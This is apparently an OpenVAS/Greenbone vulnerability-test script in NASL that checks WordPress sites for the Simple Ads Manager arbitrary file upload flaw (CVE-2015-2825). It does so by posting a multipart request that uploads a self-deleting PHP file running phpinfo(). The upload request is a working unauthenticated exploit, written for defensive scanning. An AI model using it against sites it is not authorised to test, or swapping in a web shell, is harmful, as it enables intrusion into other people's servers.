# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805530");
  script_version("2023-07-25T05:05:58+0000");
  script_cve_id("CVE-2015-2825");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-04-08 18:02:38 +0530 (Wed, 08 Apr 2015)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("WordPress Simple Ads Manager Plugin File Upload Vulnerability");

  script_tag(name:"summary", value:"WordPress Simple Ads Manager Plugin is prone to arbitrary file upload vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is able to upload file or not.");

  script_tag(name:"insight", value:"The flaw exists because the sam-ajax-admin.php
  script does not properly verify or sanitize user-uploaded files passed via
  the 'path' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unauthenticated remote attacker to upload files in an affected site.");

  script_tag(name:"affected", value:"WordPress Simple Ads Manager Plugin
  version 2.5.94.");

  script_tag(name:"solution", value:"Update to WordPress Simple Ads Manager
  Plugin version 2.6.96 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36614");
  script_xref(name:"URL", value:"http://www.itas.vn/news/ITAS-Team-found-out-multiple-critical-vulnerabilities-in-Hakin9-IT-Security-Magazine-78.html?language=en");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://profiles.wordpress.org/minimus");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

res = http_get_cache(item:url, port:port);

if(res && res =~ "^HTTP/1\.[01] 200") {

  vtstrings = get_vt_strings();
  useragent = http_get_user_agent();

  fileName = vtstrings["lowercase_rand"] + ".php";

  postData = string('-----------------------------18047369202321924582120237505\r\n',
                    'Content-Disposition: form-data; name="path"\r\n\r\n\r\n',
                    '-----------------------------18047369202321924582120237505\r\n',
                    'Content-Disposition: form-data; name="uploadfile"; filename="', fileName ,'"\r\n',
                    'Content-Type: text/html', '\r\n\r\n',
                    '<?php phpinfo(); unlink( "', fileName, '" ); ?>\r\n\r\n',
                    '-----------------------------18047369202321924582120237505\r\n',
                    'Content-Disposition: form-data; name="action"\r\n\r\n',
                    'upload_ad_image\r\n',
                    '-----------------------------18047369202321924582120237505--');

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Content-Type: multipart/form-data; boundary=---------------------------18047369202321924582120237505\r\n",
               "Content-Length: ", strlen(postData), "\r\n",
               "\r\n", postData);
  res = http_keepalive_send_recv(port:port, data:req);

  if('success' >< res && res =~ "^HTTP/1\.[01] 200") {

    report = http_report_vuln_url(port:port, url:url);
    url = dir + "/wp-content/plugins/simple-ads-manager/" + fileName;

    if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:">phpinfo\(\)<", extra_check:">System")) {

      if(http_vuln_check(port:port, url:url, check_header:FALSE, pattern:"^HTTP/1\.[01] 200")) {
        report += '\nUnable to delete the uploaded file at ' + http_report_vuln_url(port:port, url:url, url_only:TRUE) + ". Please delete this file manually.";
      }

      security_message(port:port, data:report);
      exit(0);
    }
  }
  exit(99);
}

exit(0);
